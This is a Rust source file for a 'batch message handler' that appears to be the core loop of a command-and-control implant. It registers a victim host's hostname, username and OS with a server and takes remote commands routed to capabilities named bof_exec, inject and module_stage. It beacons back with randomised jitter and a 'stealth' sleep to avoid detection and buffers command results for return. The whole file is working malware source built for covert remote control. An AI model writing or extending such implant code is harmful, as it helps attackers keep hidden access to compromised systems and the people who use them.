// Batch Message Handler Module
//
// Optimized message handler with asynchronous plugin execution and result buffering.
// This handler ensures that plugin execution doesn't block the main heartbeat loop
// and provides network resilience through result buffering.

use crate::error::{ClientError, Result};
use crate::plugin_router::{BatchConfig, BatchExecutionManager, BufferedResult};
use crate::transport::Transport;
use crate::types::{CommandResult, MessageType, MessageWrapper, SystemInfo};
use log::{debug, error, info, warn};
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::time::{Duration, Instant};

/// Optimized message handler with batch execution support
///
/// Command dispatch is delegated to [`MessageHandler`] so product paths
/// (module_stage, bof_exec, inject, …) stay consistent.
/// The batch manager remains available for optional background plugin tasks.
pub struct BatchMessageHandler {
    /// Transport layer (Option so we can lend it to MessageHandler for dispatch)
    transport: Option<Box<dyn Transport>>,
    /// Batch execution manager
    batch_manager: Arc<BatchExecutionManager>,
    /// Last successful network communication timestamp
    last_network_success: Arc<Mutex<Instant>>,
    /// Network health status
    network_healthy: Arc<Mutex<bool>>,
    /// Receiver for execution results from background tasks
    result_rx: tokio::sync::mpsc::UnboundedReceiver<Vec<BufferedResult>>,
}

impl BatchMessageHandler {
    /// Create new batch message handler
    ///
    /// # Parameters
    ///
    /// * `transport` - Transport layer implementation
    /// * `batch_config` - Configuration for batch execution
    pub fn new(transport: Box<dyn Transport>, batch_config: Option<BatchConfig>) -> Self {
        let config = batch_config.unwrap_or_default();
        let (result_tx, result_rx) = tokio::sync::mpsc::unbounded_channel();

        let batch_manager = Arc::new(BatchExecutionManager::new(config));

        let result_tx = Arc::new(result_tx);

        {
            let tx = Arc::clone(&result_tx);
            batch_manager.set_network_callback(Arc::new(move |results| {
                let tx = Arc::clone(&tx);
                tokio::spawn(async move {
                    if let Err(e) = tx.send(results) {
                        error!("Failed to send results to main loop: {}", e);
                        false
                    } else {
                        true
                    }
                })
            }));
        }

        Self {
            transport: Some(transport),
            batch_manager,
            last_network_success: Arc::new(Mutex::new(Instant::now())),
            network_healthy: Arc::new(Mutex::new(true)),
            result_rx,
        }
    }

    fn take_transport(&mut self) -> Result<Box<dyn Transport>> {
        self.transport
            .take()
            .ok_or_else(|| ClientError::ConnectionError("transport missing".into()))
    }

    fn put_transport(&mut self, t: Box<dyn Transport>) {
        self.transport = Some(t);
    }

    /// Run message loop: register → select(receive / result flush / heartbeat).
    ///
    /// Heartbeat is a real `select` branch (no 100ms receive timeout that starves it).
    pub async fn run(mut self) -> std::result::Result<Box<dyn Transport>, ClientError> {
        if let Err(e) = self.register().await {
            error!("Failed to register: {}", e);
            return Err(e);
        }

        self.start_background_tasks().await;

        info!("Entering batch message loop (MessageHandler dispatch + heartbeat)");

        let base_interval = crate::config::get_heartbeat_interval();
        let interval_secs = if base_interval == 0 {
            30
        } else {
            base_interval
        };
        // Keep ≤300s so we stay under typical server idle read timeout (≤600s)
        let interval_secs = interval_secs.min(300);
        let jitter_percent = 50;

        loop {
            let jitter_range = (interval_secs * jitter_percent / 100).max(5);
            let jitter = crate::utils::random_range(0, jitter_range as u32);
            let final_delay = if crate::utils::random_bool(0.5) {
                (interval_secs + jitter as u64).min(300)
            } else {
                interval_secs.saturating_sub(jitter as u64).max(10)
            };

            crate::db_print!(
                "[*] batch loop; next heartbeat {}s",
                final_delay
            );

            let transport = match self.transport.as_mut() {
                Some(t) => t,
                None => {
                    return Err(ClientError::ConnectionError("transport missing".into()));
                }
            };

            tokio::select! {
                // Full-frame receive (no short timeout — must not starve heartbeat)
                recv_res = transport.receive() => {
                    match recv_res {
                        Ok(data) => {
                            if data.is_empty() {
                                warn!("Connection closed by server");
                                return Ok(self.take_transport()?);
                            }
                            self.update_network_health(true).await;
                            if let Err(e) = self.handle_message_async(&data).await {
                                if let ClientError::ConnectionError(_) = e {
                                    return Ok(self.take_transport()?);
                                }
                                error!("Error handling message: {}", e);
                            }
                        }
                        Err(e) => {
                            error!("Transport error: {}", e);
                            self.update_network_health(false).await;
                            return Ok(self.take_transport()?);
                        }
                    }
                }

                Some(results) = self.result_rx.recv() => {
                    info!("Sending {} buffered execution results", results.len());
                    for buffered in results {
                        let response_msg = buffered.result.to_response_message();
                        if let Err(e) = self.send_message(&response_msg).await {
                            error!("Failed to send buffered result: {}", e);
                            return Ok(self.take_transport()?);
                        }
                    }
                }

                _ = crate::stealth::stealth_sleep(final_delay as u32 * 1000) => {
                    let heartbeat_res = CommandResult {
                        stdout: String::new(),
                        stderr: String::new(),
                        path: None,
                        req_id: Some("heartbeat".to_string()),
                    };

                    if let Err(e) = self.send_message(&heartbeat_res.to_response_message()).await {
                        warn!("Heartbeat send failed: {} — reconnecting", e);
                        return Ok(self.take_transport()?);
                    }
                    self.perform_periodic_tasks().await;
                }
            }
        }
    }

    /// Send registration message
    async fn register(&mut self) -> Result<()> {
        info!("Collecting system information...");

        let sys_info = SystemInfo::collect();
        info!("Registered with UUID: {}", sys_info.uuid);
        info!("Hostname: {}", sys_info.hostname);
        info!("OS: {}", sys_info.os);
        info!("Username: {}", sys_info.username);

        // Initialize transport
        if let Some(t) = self.transport.as_mut() {
            t.initialize(&sys_info.uuid);
        }

        // Send registration message
        let register_msg = sys_info.to_register_message();
        self.send_message(&register_msg).await?;

        info!("Registration message sent successfully");
        Ok(())
    }

    /// Handle message asynchronously (non-blocking)
    async fn handle_message_async(&mut self, data: &[u8]) -> Result<()> {
        // Convert to string
        let text = String::from_utf8(data.to_vec()).map_err(|e| {
            ClientError::ConnectionError(format!("Invalid UTF-8 in received message: {}", e))
        })?;

        debug!("Received message: {}", text);

        // Deserialize message
        let wrapper: MessageWrapper = match serde_json::from_str(&text) {
            Ok(w) => w,
            Err(e) => {
                error!("Failed to deserialize message: {}", e);
                return Err(ClientError::SerializationError(e));
            }
        };

        // Handle based on message type
        match wrapper.msg_type {
            MessageType::Command => {
                // Handle command asynchronously
                self.handle_command_async(wrapper).await?;
            }
            MessageType::Register => {
                warn!("Received unexpected Register message from server");
            }
            MessageType::Response => {
                warn!("Received unexpected Response message from server");
            }
        }

        Ok(())
    }

    /// Dispatch every command through MessageHandler (product path: classic BOF,
    /// module_stage, inject, etc.).
    async fn handle_command_async(&mut self, wrapper: MessageWrapper) -> Result<()> {
        let transport = self.take_transport()?;
        let mut mh = crate::handler::MessageHandler::new(transport);
        let res = mh.handle_command(wrapper).await;
        self.put_transport(mh.into_transport());
        res
    }

    /// Send message through transport
    async fn send_message(&mut self, message: &MessageWrapper) -> Result<()> {
        let json =
            serde_json::to_string(message).map_err(|e| ClientError::SerializationError(e))?;

        let transport = self
            .transport
            .as_mut()
            .ok_or_else(|| ClientError::ConnectionError("transport missing".into()))?;

        match transport.send(json.as_bytes()).await {
            Ok(_) => {
                self.update_network_health(true).await;
                Ok(())
            }
            Err(e) => {
                self.update_network_health(false).await;
                Err(e)
            }
        }
    }

    /// Update network health status
    async fn update_network_health(&self, healthy: bool) {
        let mut network_healthy = self.network_healthy.lock().await;
        let mut last_success = self.last_network_success.lock().await;

        if healthy {
            *network_healthy = true;
            *last_success = Instant::now();
        } else {
            *network_healthy = false;
        }
    }

    /// Start background tasks
    async fn start_background_tasks(&self) {
        let batch_manager_weak = Arc::downgrade(&self.batch_manager);
        let network_healthy_weak = Arc::downgrade(&self.network_healthy);

        // Background task for periodic buffer flushing
        tokio::spawn(async move {
            let mut flush_interval = tokio::time::interval(Duration::from_secs(10));

            loop {
                flush_interval.tick().await;

                // If parent handler was dropped due to disconnect, exit the background task
                let batch_manager = match batch_manager_weak.upgrade() {
                    Some(arc) => arc,
                    None => {
                        info!("🛑 Background flush task exiting (session closed)");
                        break;
                    }
                };

                let network_healthy = match network_healthy_weak.upgrade() {
                    Some(arc) => arc,
                    None => break,
                };

                // Check if network is healthy before flushing
                let is_healthy = *network_healthy.lock().await;
                if is_healthy {
                    let (buffer_size, _) = batch_manager.get_buffer_status().await;
                    if buffer_size > 0 {
                        info!("🔄 Background flush: {} buffered results", buffer_size);
                        batch_manager.flush_buffer().await;
                    }
                } else {
                    debug!("⏸️ Skipping buffer flush due to network issues");
                }
            }
        });
    }

    /// Perform periodic maintenance tasks
    async fn perform_periodic_tasks(&self) {
        // Check buffer status
        let (buffer_size, max_size) = self.batch_manager.get_buffer_status().await;
        if buffer_size > max_size / 2 {
            debug!(
                "📊 Buffer status: {}/{} ({}%)",
                buffer_size,
                max_size,
                (buffer_size * 100) / max_size
            );
        }

        // Force flush if buffer is getting full and network is healthy
        let is_healthy = *self.network_healthy.lock().await;
        if is_healthy && buffer_size > (max_size * 3) / 4 {
            info!(
                "🚨 Buffer nearly full, forcing flush: {}/{}",
                buffer_size, max_size
            );
            self.batch_manager.flush_buffer().await;
        }
    }
}
